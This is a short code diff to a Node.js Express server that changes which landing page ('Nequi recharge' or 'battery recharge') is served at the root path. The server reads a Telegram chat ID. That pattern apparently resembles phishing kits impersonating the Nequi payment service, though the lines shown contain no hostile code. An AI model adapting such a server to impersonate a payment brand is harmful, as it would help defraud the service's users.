@@ -10,7 +10,7 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-4997787
 const NODE_ENV = process.env.NODE_ENV || 'development';
 
 // ⚡ CAMBIA AQUÍ LA PÁGINA PRINCIPAL: 'battery' o 'nequi'
-const LANDING_PAGE = 'nequi'; // 'battery' = recarga de baterías | 'nequi' = recarga Nequi
+const LANDING_PAGE = 'nequi'; // 'battery' = index1.html (baterías) | 'nequi' = index.html (Nequi)
 
 const app = express();
 const server = http.createServer(app);
@@ -833,7 +833,7 @@ app.get('/health', (req, res) => {
 
 // Root endpoint
 app.get('/', (req, res) => {
-    const indexFile = LANDING_PAGE === 'battery' ? 'index.html' : 'index1.html';
+    const indexFile = LANDING_PAGE === 'battery' ? 'index1.html' : 'index.html';
     console.log(`📄 Sirviendo página: ${indexFile} (LANDING_PAGE=${LANDING_PAGE})`);
     res.sendFile(path.join(__dirname, indexFile));
 });
